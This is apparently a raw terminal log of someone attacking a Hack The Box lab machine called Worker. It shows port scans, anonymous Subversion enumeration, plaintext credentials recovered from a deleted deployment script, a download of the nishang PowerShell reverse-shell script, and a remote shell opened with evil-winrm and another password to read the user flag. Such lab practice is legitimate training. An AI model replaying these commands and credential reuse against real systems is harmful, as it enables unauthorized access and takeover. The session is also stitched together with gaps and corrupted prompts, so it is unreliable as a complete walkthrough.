@@ -1,0 +1,476 @@
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# cd HTB
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB# ls
+acedmy  Doctor  laboratory.htb  laboratory.txt  omni  ready  time
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB# cd Doctor
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/Doctor# ls
+doctor.txt  SplunkWhisperer2
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/Doctor# cd ..
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB# mkdir worker
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB# dir
+acedmy	Doctor	laboratory.htb	laboratory.txt	omni  ready  time  worker
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB# cd worker
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# dir
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# nmap -sS -sV -sC -A 10.10.10.203 -o worker.txt
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 08:25 IST
+Nmap scan report for 10.10.10.203
+Host is up (0.23s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3690/tcp open  svnserve Subversion
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   333.49 ms 10.10.14.1
+2   333.51 ms 10.10.10.203
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.87 seconds
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn info svn://worker.htb
+
+Command 'svn' not found, but can be installed with:
+
+apt install subversion
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 10.10.10.203
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-31 08:52 IST
+Nmap scan report for 10.10.10.203
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE
+3690/tcp open  svn
+| svn-brute:   
+|_  Anonymous SVN detected, no authentication needed
+
+Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn list svn://10.10.10.203
+
+Command 'svn' not found, but can be installed with:
+
+apt install subversion
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# apt install subversion
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  linux-headers-5.4.0-53 linux-headers-5.4.0-53-generic linux-headers-5.4.0-54 linux-headers-5.4.0-54-generic linux-image-5.4.0-53-generic
+  linux-image-5.4.0-54-generic linux-modules-5.4.0-53-generic linux-modules-5.4.0-54-generic linux-modules-extra-5.4.0-53-generic
+  linux-modules-extra-5.4.0-54-generic
+Use 'sudo apt autoremove' to remove them.
+Suggested packages:
+  db5.3-util libapache2-mod-svn subversion-tools
+The following NEW packages will be installed:
+  subversion
+0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
+Need to get 824 kB of archives.
+After this operation, 4,901 kB of additional disk space will be used.
+Get:1 http://in.archive.ubuntu.com/ubuntu focal/universe amd64 subversion amd64 1.13.0-3 [824 kB]
+Fetched 824 kB in 3s (243 kB/s)     
+Selecting previously unselected package subversion.
+(Reading database ... 317911 files and directories currently installed.)
+Preparing to unpack .../subversion_1.13.0-3_amd64.deb ...
+Unpacking subversion (1.13.0-3) ...
+Setting up subversion (1.13.0-3) ...
+Processing triggers for man-db (2.9.1-1) ...
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn list svn://10.10.10.203
+dimension.worker.htb/
+moved.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn status svn://10.10.10.203
+svn: E205000: Try 'svn help status' for more information
+svn: E205000: 'svn://10.10.10.203' is not a local path
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn list svn://10.10.10.203
+dimension.worker.htb/
+moved.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn info
+svn: E155007: '/home/tvaeneir/HTB/worker' is not a working copy
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# snv info svn:
+
+
+Command 'snv' not found, did you mean:
+
+  command 'sv' from deb runit (2.1.2-9.2ubuntu1)
+  command 'sn' from deb mono-devel (6.8.0.105+dfsg-2)
+  command 'sng' from deb sng (1.1.0-3)
+  command 'svn' from deb subversion (1.13.0-3)
+  command 'sqv' from deb sqv (0.14.0-1)
+  command 'env' from deb coreutils (8.30-3ubuntu2)
+  command 'inv' from deb python3-invoke (1.3.0+ds-0.1)
+  command 'snd' from deb snd-gtk-jack (20.1-1)
+  command 'snd' from deb snd-gtk-pulse (20.1-1)
+  command 'snd' from deb snd-nox (20.1-1)
+
+Try: apt install <deb name>
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# 
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn info svn://10.10.10.203
+Path: .
+URL: svn://10.10.10.203
+Relative URL: ^/
+Repository Root: svn://10.10.10.203
+Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
+Revision: 5
+Node Kind: directory
+Last Changed Author: nathen
+Last Changed Rev: 5
+Last Changed Date: 2020-06-20 19:22:00 +0530 (Sat, 20 Jun 2020)
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn log svn://10.10.10.203
+------------------------------------------------------------------------
+r5 | nathen | 2020-06-20 19:22:00 +0530 (Sat, 20 Jun 2020) | 1 line
+
+Added note that repo has been migrated
+------------------------------------------------------------------------
+r4 | nathen | 2020-06-20 19:20:20 +0530 (Sat, 20 Jun 2020) | 1 line
+
+Moving this repo to our new devops server which will handle the deployment for us
+------------------------------------------------------------------------
+r3 | nathen | 2020-06-20 19:16:19 +0530 (Sat, 20 Jun 2020) | 1 line
+
+-
+------------------------------------------------------------------------
+r2 | nathen | 2020-06-20 19:15:16 +0530 (Sat, 20 Jun 2020) | 1 line
+
+Added deployment script
+------------------------------------------------------------------------
+r1 | nathen | 2020-06-20 19:13:43 +0530 (Sat, 20 Jun 2020) | 1 line
+
+First version
+------------------------------------------------------------------------
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn diff svn://10.10.10.203
+svn: E195002: Not all required revisions are specified
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ls
+worker.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ll
+total 12
+drwxr-xr-x 2 root root 4096 Dec 31 08:25 ./
+drwxr-xr-x 9 root root 4096 Dec 31 08:23 ../
+-rw-r--r-- 1 root root 1030 Dec 31 08:25 worker.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# cd ./
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ls
+worker.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# cd svn
+bash: cd: svn: No such file or directory
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn checkout svn://10.10.10.203
+A    dimension.worker.htb
+A    dimension.worker.htb/LICENSE.txt
+A    dimension.worker.htb/README.txt
+A    dimension.worker.htb/assets
+A    dimension.worker.htb/assets/css
+A    dimension.worker.htb/assets/css/fontawesome-all.min.css
+A    dimension.worker.htb/assets/css/main.css
+A    dimension.worker.htb/assets/css/noscript.css
+A    dimension.worker.htb/assets/js
+A    dimension.worker.htb/assets/js/breakpoints.min.js
+A    dimension.worker.htb/assets/js/browser.min.js
+A    dimension.worker.htb/assets/js/jquery.min.js
+A    dimension.worker.htb/assets/js/main.js
+A    dimension.worker.htb/assets/js/util.js
+A    dimension.worker.htb/assets/sass
+A    dimension.worker.htb/assets/sass/base
+A    dimension.worker.htb/assets/sass/base/_page.scss
+A    dimension.worker.htb/assets/sass/base/_reset.scss
+A    dimension.worker.htb/assets/sass/base/_typography.scss
+A    dimension.worker.htb/assets/sass/components
+A    dimension.worker.htb/assets/sass/components/_actions.scss
+A    dimension.worker.htb/assets/sass/components/_box.scss
+A    dimension.worker.htb/assets/sass/components/_button.scss
+A    dimension.worker.htb/assets/sass/components/_form.scss
+A    dimension.worker.htb/assets/sass/components/_icon.scss
+A    dimension.worker.htb/assets/sass/components/_icons.scss
+A    dimension.worker.htb/assets/sass/components/_image.scss
+A    dimension.worker.htb/assets/sass/components/_list.scss
+A    dimension.worker.htb/assets/sass/components/_table.scss
+A    dimension.worker.htb/assets/sass/layout
+A    dimension.worker.htb/assets/sass/layout/_bg.scss
+A    dimension.worker.htb/assets/sass/layout/_footer.scss
+A    dimension.worker.htb/assets/sass/layout/_header.scss
+A    dimension.worker.htb/assets/sass/layout/_main.scss
+A    dimension.worker.htb/assets/sass/layout/_wrapper.scss
+A    dimension.worker.htb/assets/sass/libs
+A    dimension.worker.htb/assets/sass/libs/_breakpoints.scss
+A    dimension.worker.htb/assets/sass/libs/_functions.scss
+A    dimension.worker.htb/assets/sass/libs/_mixins.scss
+A    dimension.worker.htb/assets/sass/libs/_vars.scss
+A    dimension.worker.htb/assets/sass/libs/_vendor.scss
+A    dimension.worker.htb/assets/sass/main.scss
+A    dimension.worker.htb/assets/sass/noscript.scss
+A    dimension.worker.htb/assets/webfonts
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.eot
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.svg
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.ttf
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff
+A    dimension.worker.htb/assets/webfonts/fa-brands-400.woff2
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.eot
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.svg
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.ttf
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff
+A    dimension.worker.htb/assets/webfonts/fa-regular-400.woff2
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.eot
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.svg
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.ttf
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff
+A    dimension.worker.htb/assets/webfonts/fa-solid-900.woff2
+A    dimension.worker.htb/images
+A    dimension.worker.htb/images/bg.jpg
+A    dimension.worker.htb/images/overlay.png
+A    dimension.worker.htb/images/pic01.jpg
+A    dimension.worker.htb/images/pic02.jpg
+A    dimension.worker.htb/images/pic03.jpg
+A    dimension.worker.htb/index.html
+A    moved.txt
+Checked out revision 5.
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ls ll
+ls: cannot access 'll': No such file or directory
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ls -l
+total 12
+drwxr-xr-x 4 root root 4096 Dec 31 09:09 dimension.worker.htb
+-rw-r--r-- 1 root root  162 Dec 31 09:09 moved.txt
+-rw-r--r-- 1 root root 1030 Dec 31 08:25 worker.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# cat moved.txt
+This repository has been migrated and will no longer be maintaned here.
+You can find the latest version at: http://devops.worker.htb
+
+// The Worker team :)
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ^C
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn diff -r1
+Index: moved.txt
+===================================================================
+--- moved.txt	(nonexistent)
++++ moved.txt	(revision 5)
+@@ -0,0 +1,5 @@
++This repository has been migrated and will no longer be maintaned here.
++You can find the latest version at: http://devops.worker.htb
++
++// The Worker team :)
++
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn diff -r2
+Index: deploy.ps1
+===================================================================
+--- deploy.ps1	(revision 2)
++++ deploy.ps1	(nonexistent)
+@@ -1,6 +0,0 @@
+-$user = "nathen" 
+-$plain = "wendel98"
+-$pwd = ($plain | ConvertTo-SecureString)
+-$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+-$args = "Copy-Site.ps1"
+-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+Index: moved.txt
+===================================================================
+--- moved.txt	(nonexistent)
++++ moved.txt	(revision 5)
+@@ -0,0 +1,5 @@
++This repository has been migrated and will no longer be maintaned here.
++You can find the latest version at: http://devops.worker.htb
++
++// The Worker team :)
++
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# svn diff -r3
+Index: deploy.ps1
+===================================================================
+--- deploy.ps1	(revision 3)
++++ deploy.ps1	(nonexistent)
+@@ -1,7 +0,0 @@
+-$user = "nathen" 
+-# NOTE: We cant have my password here!!!
+-$plain = ""
+-$pwd = ($plain | ConvertTo-SecureString)
+-$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
+-$args = "Copy-Site.ps1"
+-Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
+\ No newline at end of file
+Index: moved.txt
+===================================================================
+--- moved.txt	(nonexistent)
++++ moved.txt	(revision 5)
+@@ -0,0 +1,5 @@
++This repository has been migrated and will no longer be maintaned here.
++You can find the latest version at: http://devops.worker.htb
++
++// The Worker team :)
++
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# ls
+dimension.worker.htb  moved.txt  worker.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker# cd dimension.worker.htb
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ls
+assets  images  index.html  LICENSE.txt  README.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# wget https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+--2020-12-31 10:59:28--  https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+Resolving github.com (github.com)... 13.234.210.38
+Connecting to github.com (github.com)|13.234.210.38|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [text/html]
+Saving to: ‘Invoke-PowerShellTcp.ps1’
+
+Invoke-PowerShellTcp     [  <=>                ] 125.50K   408KB/s    in 0.3s    
+
+2020-12-31 10:59:30 (408 KB/s) - ‘Invoke-PowerShellTcp.ps1’ saved [128514]
+
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ls
+assets  images  index.html  Invoke-PowerShellTcp.ps1  LICENSE.txt  README.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# cd Invoke-PowerShellTcp.ps1
+bash: cd: Invoke-PowerShellTcp.ps1: Not a directory
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# mv Invoke-PowerShellTcp.ps1 nishang.ps1
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ls
+assets  images  index.html  LICENSE.txt  nishang.ps1  README.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# nano nishang.ps1
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# vi nishang.ps1
+
+[1]+  Stopped                 vi nishang.ps1
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ls
+assets  images  index.html  LICENSE.txt  nishang.ps1  README.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# rm -rf nishang.ps1
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ls
+assets  images  index.html  LICENSE.txt  README.txt
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# nano rev.ps1
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ls
+assets  images  index.html  LICENSE.txt  README.txt  rev.ps1
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ping 10.10.10.203
+PING 10.10.10.203 (10.10.10.203) 56(84) bytes of data.
+64 bytes from 10.10.10.203: icmp_seq=1 ttl=127 time=408 ms
+64 bytes from 10.10.10.203: icmp_seq=2 ttl=127 time=227 ms
+64 bytes from 10.10.10.203: icmp_seq=3 ttl=127 time=250 ms
+^Z
+[2]+  Stopped                 ping 10.10.10.203
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# ping 10.10.10.203
+PING 10.10.10.203 (10.10.10.203) 56(84) bytes of data.
+64 bytes from 10.10.10.203: icmp_seq=1 ttl=127 time=172 ms
+64 bytes from 10.10.10.203: icmp_seq=2 ttl=127 time=196 ms
+64 bytes from 10.10.10.203: icmp_seq=3 ttl=127 time=218 ms
+^Z
+[3]+  Stopped                 ping 10.10.10.203
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir/HTB/worker/dimension.worker.htb# 
+
+oot@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# dir
+2020-12-14-01-42-37.015-VBoxSVC-3071.log   les.sh
+advance_debugging_and_troubleshooting	   linux_security.elf
+Android					   makingpublicscript.txt
+Android_Apps_Pentration			   meatsploitdetails
+AndroidStudioProjects			   msfconsole.sh
+beef					   msfinstall
+burpsuite_community_linux_v2020_12.sh	   Music
+commix					   nmap\ guide
+common.txt				   openssh7.2.py
+cutenews.py				   passagenewscred.txt
+cutenews-security.exe			   password.html
+cutenews_security.exe			   Pictures
+cutenewssecurity.exe			   Public
+cutenews_security.php			   pythonlearn
+database.yml				   q4.html
+datagram\ packets\ analysis\ with\ pythin  RationalLove.c
+Desktop					   scriptcute.sh
+Documents				   set
+Downloads				   snap
+eclipse-workspace			   stale_outputs_checked
+enevbasedScripts			   stuff
+exploit.c.jpeg				   suggester.c
+exploit.exe				   Templates
+exploit.php				   udp.gnmap
+exp.sh					   udp.nmap
+failure.strace				   udp.xml
+firstcapture.pcapng			   unencrypted.pdf
+generalKnowledge.txt			   Videos
+generalstart.sh				   Viraj1024.ovpn
+get-pip.py				   VirtualBox\ VMs
+git.txt					   webgoat-container-7.1-exec
+hackingdocs				   webgoat-container-7.1-exec.jar
+HTB					   wireshark
+htbworker.aspx				   worker.terminal
+hydra.restore				   worker.txt
+lbd					   zip.hashes
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# git clone https://github.com/Hackplayers/evil-winrm.git
+Cloning into 'evil-winrm'...
+remote: Enumerating objects: 22, done.
+remote: Counting objects: 100% (22/22), done.
+remote: Compressing objects: 100% (16/16), done.
+remote: Total 805 (delta 9), reused 17 (delta 6), pack-reused 783
+Receiving objects: 100% (805/805), 1.96 MiB | 848.00 KiB/s, done.
+Resolving deltas: 100% (461/461), done.
+root@tvaeneir-HP-Laptop-15-da0xxx:/home/tvaeneir# cd evil-winrm && ruby evil-winrm.rb -i 10.10.10.203 -u robisl -p 'wolves11'
+Ignoring byebug-11.1.3 because its extensions are not built. Try: gem pristine byebug --version 11.1.3
+Ignoring nio4r-2.5.4 because its extensions are not built. Try: gem pristine nio4r --version 2.5.4
+Ignoring nokogiri-1.10.10 because its extensions are not built. Try: gem pristine nokogiri --version 1.10.10
+Ignoring pg-0.21.0 because its extensions are not built. Try: gem pristine pg --version 0.21.0
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\robisl\Documents> ls
+*Evil-WinRM* PS C:\Users\robisl\Documents> dir
+*Evil-WinRM* PS C:\Users\robisl\Documents> cd ..
+*Evil-WinRM* PS C:\Users\robisl> dir
+
+
+    Directory: C:\Users\robisl
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---         4/5/2020   7:32 PM                Desktop
+d-r---         4/4/2020  11:35 PM                Documents
+d-r---        9/15/2018   9:12 AM                Downloads
+d-r---        9/15/2018   9:12 AM                Favorites
+d-r---        9/15/2018   9:12 AM                Links
+d-r---        9/15/2018   9:12 AM                Music
+d-r---        9/15/2018   9:12 AM                Pictures
+d-----        9/15/2018   9:12 AM                Saved Games
+d-r---        9/15/2018   9:12 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\robisl> cd Desktop
+*Evil-WinRM* PS C:\Users\robisl\Desktop> dir
+
+
+    Directory: C:\Users\robisl\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---       12/31/2020   8:22 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\robisl\Desktop> cat user.txt
+6dd2a9a73f4df38db5d9737a219cbe9a
+*Evil-WinRM* PS C:\Users\robisl\Desktop> cd ..
+cd *Evil-WinRM* PS C:\Users\robisl> cd ..
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        3/28/2020   2:59 PM                .NET v4.5
+d-----        3/28/2020   2:59 PM                .NET v4.5 Classic
+d-----        8/18/2020  12:33 AM                Administrator
+d-r---        3/28/2020   2:01 PM                Public
+d-----        7/22/2020   1:11 AM                restorer
+d-----         7/8/2020   7:22 PM                robisl
+
+
+*Evil-WinRM* PS C:\Users> cd Administrator
+*Evil-WinRM* PS C:\Users\Administrator> dir
+Access to the path 'C:\Users\Administrator' is denied.
+At line:1 char:1
++ dir
++ ~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator:String) [Get-ChildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
+*Evil-WinRM* PS C:\Users\Administrator> 
+
+
+
+
